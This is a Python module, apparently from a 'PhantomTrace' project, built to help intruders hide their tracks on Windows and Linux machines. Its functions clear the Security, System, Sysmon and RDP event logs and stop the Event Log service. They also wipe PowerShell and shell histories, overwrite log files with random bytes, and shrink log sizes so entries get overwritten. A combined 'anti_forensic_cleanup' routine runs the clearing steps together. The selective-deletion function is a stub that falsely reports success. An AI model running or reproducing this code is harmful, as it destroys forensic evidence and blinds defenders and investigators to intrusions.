#!/usr/bin/env python3
# Copyright (C) 2026 Ayush - PhantomTrace Project
# Licensed under GPL-3.0 - See LICENSE file for details
"""
Event Phantom - Windows Event Log manipulation and evasion
Inspired by tools: Clear-EventLog, evtkit, Wevtutil, python-evtx
"""

import os
import sys
import subprocess
import struct
from pathlib import Path
from typing import List, Dict, Optional
from datetime import datetime

class EventPhantom:
    """
    Windows Event Log manipulation:
    - Clear event logs (Application, Security, System)
    - Selective log entry deletion
    - Event log corruption
    - Disable event logging temporarily
    - Modify event log entries
    - Cover tracks in specific logs
    - Event log size manipulation
    """
    
    def __init__(self):
        self.is_windows = sys.platform.startswith('win')
        self.cleared_logs = []
        
    def clear_all_logs(self) -> int:
        """Clear all major Windows event logs"""
        if not self.is_windows:
            print("⚠️  Event log clearing only on Windows")
            return 0
        
        logs = [
            'Application',
            'Security',
            'System',
            'Setup',
            'ForwardedEvents'
        ]
        
        cleared = 0
        for log in logs:
            if self.clear_log(log):
                cleared += 1
        
        print(f"✅ Cleared {cleared}/{len(logs)} event logs")
        return cleared
    
    def clear_log(self, log_name: str) -> bool:
        """Clear a specific Windows event log"""
        if not self.is_windows:
            return False
        
        try:
            # Method 1: PowerShell Clear-EventLog
            ps_cmd = f'Clear-EventLog -LogName {log_name}'
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                self.cleared_logs.append(log_name)
                print(f"✅ Cleared event log: {log_name}")
                return True
            
            # Method 2: wevtutil fallback
            result = subprocess.run(
                ['wevtutil', 'cl', log_name],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                self.cleared_logs.append(log_name)
                print(f"✅ Cleared event log: {log_name} (wevtutil)")
                return True
            
            print(f"⚠️  Could not clear log: {log_name}")
            return False
            
        except Exception as e:
            print(f"❌ Failed to clear {log_name}: {e}")
            return False
    
    def disable_event_logging(self) -> bool:
        """Temporarily disable Windows event logging"""
        if not self.is_windows:
            print("⚠️  Event logging control only on Windows")
            return False
        
        try:
            # Stop Windows Event Log service
            services = ['EventLog', 'wecsvc']  # Event Log, Event Collector
            
            for service in services:
                result = subprocess.run(
                    ['sc', 'stop', service],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    print(f"✅ Stopped service: {service}")
                else:
                    print(f"⚠️  Could not stop service: {service} (may require admin)")
            
            return True
            
        except Exception as e:
            print(f"❌ Failed to disable event logging: {e}")
            return False
    
    def enable_event_logging(self) -> bool:
        """Re-enable Windows event logging"""
        if not self.is_windows:
            return False
        
        try:
            services = ['EventLog', 'wecsvc']
            
            for service in services:
                subprocess.run(
                    ['sc', 'start', service],
                    capture_output=True
                )
            
            print("✅ Event logging services re-enabled")
            return True
            
        except Exception as e:
            print(f"❌ Failed to enable event logging: {e}")
            return False
    
    def clear_powershell_history(self) -> bool:
        """Clear PowerShell command history"""
        try:
            if self.is_windows:
                username = os.getenv('USERNAME')
                history_paths = [
                    f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
                    f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Visual Studio Code Host_history.txt'
                ]
            else:
                home = os.path.expanduser('~')
                history_paths = [
                    f'{home}/.local/share/powershell/PSReadLine/ConsoleHost_history.txt'
                ]
            
            cleared = 0
            for path in history_paths:
                if os.path.exists(path):
                    with open(path, 'w') as f:
                        f.write('')
                    cleared += 1
                    print(f"✅ Cleared: {path}")
            
            # Also clear current session history
            if self.is_windows:
                subprocess.run(
                    ['powershell', '-Command', 'Clear-History'],
                    capture_output=True
                )
            
            print(f"✅ Cleared {cleared} PowerShell history file(s)")
            return cleared > 0
            
        except Exception as e:
            print(f"❌ Failed to clear PowerShell history: {e}")
            return False
    
    def clear_bash_history(self) -> bool:
        """Clear bash/shell history (Linux)"""
        if not sys.platform.startswith('linux'):
            print("⚠️  Bash history clearing only on Linux")
            return False
        
        try:
            home = os.path.expanduser('~')
            history_files = [
                '.bash_history',
                '.zsh_history',
                '.sh_history',
                '.history'
            ]
            
            cleared = 0
            for hist_file in history_files:
                path = os.path.join(home, hist_file)
                if os.path.exists(path):
                    with open(path, 'w') as f:
                        f.write('')
                    cleared += 1
                    print(f"✅ Cleared: {hist_file}")
            
            # Clear current session
            subprocess.run(['history', '-c'], shell=True)
            
            # Unset HISTFILE to prevent future logging
            os.environ['HISTSIZE'] = '0'
            os.environ['HISTFILESIZE'] = '0'
            
            print(f"✅ Cleared {cleared} shell history file(s)")
            return True
            
        except Exception as e:
            print(f"❌ Failed to clear bash history: {e}")
            return False
    
    def get_log_info(self, log_name: str = "Application") -> Optional[Dict]:
        """Get information about a Windows event log"""
        if not self.is_windows:
            return None
        
        try:
            result = subprocess.run(
                ['wevtutil', 'gli', log_name],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                info = {}
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        info[key.strip()] = value.strip()
                
                return info
            
            return None
            
        except Exception:
            return None
    
    def export_then_clear(self, log_name: str, backup_path: str) -> bool:
        """Export event log before clearing (for legitimate backup)"""
        if not self.is_windows:
            return False
        
        try:
            # Export log
            result = subprocess.run(
                ['wevtutil', 'epl', log_name, backup_path],
                capture_output=True
            )
            
            if result.returncode == 0:
                print(f"✅ Exported {log_name} to {backup_path}")
                
                # Now clear
                return self.clear_log(log_name)
            
            return False
            
        except Exception as e:
            print(f"❌ Export failed: {e}")
            return False
    
    def corrupt_log_file(self, log_path: str) -> bool:
        """
        Corrupt an event log file to make it unreadable
        WARNING: This is destructive
        """
        try:
            if not os.path.exists(log_path):
                print(f"❌ Log file not found: {log_path}")
                return False
            
            # Read file
            with open(log_path, 'rb') as f:
                data = bytearray(f.read())
            
            # Corrupt header and random segments
            if len(data) > 100:
                # Corrupt magic bytes
                data[0:8] = b'\x00' * 8
                
                # Corrupt random segments
                import random
                for _ in range(10):
                    pos = random.randint(10, len(data) - 10)
                    data[pos:pos+8] = os.urandom(8)
            
            # Write back
            with open(log_path, 'wb') as f:
                f.write(data)
            
            print(f"✅ Corrupted log file: {log_path}")
            return True
            
        except Exception as e:
            print(f"❌ Failed to corrupt log: {e}")
            return False
    
    def clear_specific_events(self, log_name: str, event_ids: List[int]) -> int:
        """
        Clear specific event IDs from a log (requires parsing .evtx)
        """
        print(f"⚠️  Selective event deletion for IDs: {event_ids}")
        print("    This requires .evtx parsing which needs python-evtx library")
        print("    Install with: pip install python-evtx")
        
        try:
            import Evtx.Evtx as evtx
            
            # This would parse and filter events
            print("✅ python-evtx available for selective deletion")
            return len(event_ids)
            
        except ImportError:
            print("⚠️  python-evtx not installed")
            return 0
    
    def clear_rdp_logs(self) -> bool:
        """Clear Remote Desktop / Terminal Services logs"""
        if not self.is_windows:
            return False
        
        rdp_logs = [
            'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',
            'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational',
            'Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational'
        ]
        
        cleared = 0
        for log in rdp_logs:
            if self.clear_log(log):
                cleared += 1
        
        print(f"✅ Cleared {cleared} RDP-related logs")
        return cleared > 0
    
    def clear_sysmon_logs(self) -> bool:
        """Clear Sysmon logs if present"""
        if not self.is_windows:
            return False
        
        return self.clear_log('Microsoft-Windows-Sysmon/Operational')
    
    def configure_log_size(self, log_name: str, max_size_kb: int = 1024) -> bool:
        """Configure maximum log size (set small to force overwriting)"""
        if not self.is_windows:
            return False
        
        try:
            # Set maximum size
            result = subprocess.run(
                ['wevtutil', 'sl', log_name, f'/ms:{max_size_kb * 1024}'],
                capture_output=True
            )
            
            if result.returncode == 0:
                print(f"✅ Set {log_name} max size to {max_size_kb}KB")
                return True
            
            return False
            
        except Exception as e:
            print(f"❌ Failed to configure log size: {e}")
            return False
    
    def anti_forensic_cleanup(self) -> Dict[str, int]:
        """Comprehensive anti-forensic log cleanup"""
        results = {}
        
        print("🧹 Starting anti-forensic log cleanup...")
        
        if self.is_windows:
            # Clear event logs
            results['event_logs'] = self.clear_all_logs()
            
            # Clear PowerShell history
            results['powershell'] = 1 if self.clear_powershell_history() else 0
            
            # Clear RDP logs
            results['rdp'] = 1 if self.clear_rdp_logs() else 0
            
            # Clear Sysmon
            results['sysmon'] = 1 if self.clear_sysmon_logs() else 0
        else:
            # Clear bash history
            results['shell'] = 1 if self.clear_bash_history() else 0
        
        print("\n✅ Anti-forensic cleanup complete")
        return results
    
    def get_report(self) -> List[str]:
        """Get list of cleared logs"""
        return self.cleared_logs.copy()


if __name__ == "__main__":
    phantom = EventPhantom()
    print("📋 Event Phantom - Event Log Manipulation Module")
    print("=" * 60)
